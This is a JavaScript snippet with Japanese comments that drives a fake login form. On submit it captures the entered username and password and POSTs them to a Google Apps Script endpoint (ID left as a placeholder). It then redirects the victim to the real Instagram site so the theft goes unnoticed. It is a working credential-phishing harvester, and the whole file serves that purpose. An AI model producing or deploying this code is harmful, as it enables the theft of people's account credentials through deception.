document.getElementById("login-form").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Google Apps Scriptに送信（★ここが重要）
    fetch("https://script.google.com/macros/s/XXXXXXXXXXXXXXXXXXXXXXXX/exec", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    })
    .then(response => response.text())
    .then(data => {
        console.log("送信成功:", data);
        // ログイン成功として好きな場所にリダイレクト
        window.location.href = "https://www.instagram.com/";
    })
    .catch(error => {
        console.error("送信エラー:", error);
        alert("送信に失敗しました。");
    });

    this.reset(); // フォームをリセット
});